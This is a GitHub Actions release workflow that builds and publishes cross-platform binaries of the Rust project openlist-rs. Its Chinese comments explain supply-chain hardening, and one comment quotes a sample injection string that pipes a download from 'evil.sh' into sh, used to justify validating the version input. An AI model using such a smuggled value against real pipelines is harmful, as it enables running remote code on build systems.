name: release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Release version (e.g. v1.0.0)"
        required: true
        default: 'v0.1.0'
        type: string

permissions:
  contents: write

env:
  BIN_NAME: openlist-rs

jobs:
  # 前端只构建一次：产物与平台无关，5 个矩阵 job 下载同一份
  frontend:
    name: build frontend
    runs-on: ubuntu-latest
    steps:
      # 第三方 Action 一律固定 commit SHA：按 tag/branch 引用时上游一次 push 就能
      # 换掉构建工具链（供应链攻击面）。升级走 Dependabot 的 PR 流程。
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 22

      - name: Build frontend
        working-directory: web
        run: |
          npm ci --no-audit --no-fund
          npm run build

      - name: Upload web/dist
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: web-dist
          path: web/dist
          retention-days: 1

  build:
    name: build (${{ matrix.artifact }})
    needs: frontend
    runs-on: ${{ matrix.runner }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - runner: ubuntu-latest
            target: x86_64-unknown-linux-musl
            artifact: openlist-rs-linux-amd64

          - runner: ubuntu-24.04-arm
            target: aarch64-unknown-linux-musl
            artifact: openlist-rs-linux-arm64

          # Windows x64
          - runner: windows-latest
            target: x86_64-pc-windows-msvc
            artifact: openlist-rs-windows-amd64

          - runner: macos-latest
            target: aarch64-apple-darwin
            artifact: openlist-rs-macos-arm64

          # Android arm64
          - runner: ubuntu-latest
            target: aarch64-linux-android
            artifact: openlist-rs-android-arm64

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      # 1. 前端产物（由 frontend job 构建一次，rust-embed 编译期嵌入）
      - name: Download web/dist
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: web-dist
          path: web/dist

      # 版本号经 env 传入并做正则白名单：直接内插 ${{ }} 到 run 脚本里，
      # 恶意输入（如 `1.0.0"; curl evil.sh | sh; "`）可执行任意命令。
      - name: Inject version into Cargo.toml
        shell: bash
        env:
          RAW_VERSION: ${{ github.event.inputs.version }}
        run: |
          VERSION="${RAW_VERSION#v}"
          if [[ ! "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "非法版本号: $VERSION" >&2
            exit 1
          fi
          sed -i.bak "s/^version = .*/version = \"${VERSION}\"/" Cargo.toml
          rm -f Cargo.toml.bak

      # 2. Rust 工具链
      - uses: dtolnay/rust-toolchain@39008827e6b4319a349e9a42dfc90579dd25f1ca # stable
        with:
          targets: ${{ matrix.target }}

      # 改了 Cargo.toml 的版本号后，Cargo.lock 里 `openlist-rs` 那条记录的版本就对不上了，
      # 下面 `cargo build --locked` 会直接报 "cannot update the lock file"。
      # 只重锁本工作区包（`-p openlist-rs`），外部依赖版本一律不动 —— 这正是我们要的：
      # 依赖保持仓库锁定值，只有自身版本号跟随发布 tag。
      # 不能加 `--offline`：跑在 Cache cargo 之前，全新 runner 的 registry 还是空的。
      - name: Refresh workspace version in Cargo.lock
        shell: bash
        run: |
          cargo update -p openlist-rs
          # 防御性校验：只应有 openlist-rs 的版本行变化（1 行增 1 行删）
          git diff --numstat Cargo.lock

      # 3. 平台特定依赖
      - name: Install musl-tools (Linux musl)
        if: runner.os == 'Linux' && contains(matrix.target, 'musl')
        run: sudo apt-get update && sudo apt-get install -y musl-tools

      - name: Install Android NDK
        if: contains(matrix.target, 'android')
        uses: nttld/setup-ndk@ed92fe6cadad69be94a966a7ee3271275e62f779 # v1.6.0
        id: setup-ndk
        with:
          ndk-version: r27c
          add-to-path: false

      - name: Set Android linker env
        if: contains(matrix.target, 'android')
        shell: bash
        run: |
          NDK_TOOLCHAIN="${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin"
          echo "CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER=${NDK_TOOLCHAIN}/aarch64-linux-android35-clang" >> "$GITHUB_ENV"
          echo "CC_aarch64_linux_android=${NDK_TOOLCHAIN}/aarch64-linux-android35-clang" >> "$GITHUB_ENV"
          echo "AR_aarch64_linux_android=${NDK_TOOLCHAIN}/llvm-ar" >> "$GITHUB_ENV"

      - name: Set linker env (Linux musl)
        if: runner.os == 'Linux' && contains(matrix.target, 'musl')
        run: |
          T=${{ matrix.target }}
          U=$(echo "$T" | tr '-' '_' | tr 'a-z' 'A-Z')
          echo "CARGO_TARGET_${U}_LINKER=musl-gcc" >> "$GITHUB_ENV"
          echo "CC_${U}=musl-gcc" >> "$GITHUB_ENV"
          echo "AR_${U}=ar" >> "$GITHUB_ENV"

      # 不再执行 cargo update：那会让下面的 --locked 失去意义，发布产物依赖的是
      # 构建当日的最新版本而非仓库锁定的版本，与 CI 验证对象脱节。
      # 依赖升级一律走 update.yml 的 PR 流程并经 CI 验证。
      - name: Cache cargo
        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ matrix.target }}-cargo-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: ${{ matrix.target }}-cargo-

      # 4. 编译（rustls TLS，无 openssl 依赖）
      - name: Build release
        run: cargo build --release --locked --target ${{ matrix.target }}

      # 5. 打包并发布
      - name: Package (Unix)
        if: runner.os != 'Windows'
        run: |
          mkdir -p dist
          BIN_PATH="target/${{ matrix.target }}/release/$BIN_NAME"
          cp "$BIN_PATH" "dist/$BIN_NAME"
          tar -czf "${{ matrix.artifact }}.tar.gz" -C dist "$BIN_NAME"
          sha256sum "${{ matrix.artifact }}.tar.gz" > "${{ matrix.artifact }}.tar.gz.sha256"

      - name: Package (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force -Path dist | Out-Null
          Copy-Item "target/${{ matrix.target }}/release/$env:BIN_NAME.exe" "dist/$env:BIN_NAME.exe"
          Compress-Archive -Path "dist/$env:BIN_NAME.exe" -DestinationPath "${{ matrix.artifact }}.zip"
          $hash = (Get-FileHash "${{ matrix.artifact }}.zip" -Algorithm SHA256).Hash.ToLower()
          "$hash  ${{ matrix.artifact }}.zip" | Out-File -Encoding ascii "${{ matrix.artifact }}.zip.sha256"

      # 校验和文件必须一起上传，否则用户无从校验（旧版只生成不上传）
      - name: Upload release assets (Unix)
        if: runner.os != 'Windows'
        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
        with:
          tag_name: ${{ github.event.inputs.version }}
          name: openlist-rs ${{ github.event.inputs.version }}
          files: |
            ${{ matrix.artifact }}.tar.gz
            ${{ matrix.artifact }}.tar.gz.sha256

      - name: Upload release assets (Windows)
        if: runner.os == 'Windows'
        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
        with:
          tag_name: ${{ github.event.inputs.version }}
          name: openlist-rs ${{ github.event.inputs.version }}
          files: |
            ${{ matrix.artifact }}.zip
            ${{ matrix.artifact }}.zip.sha256
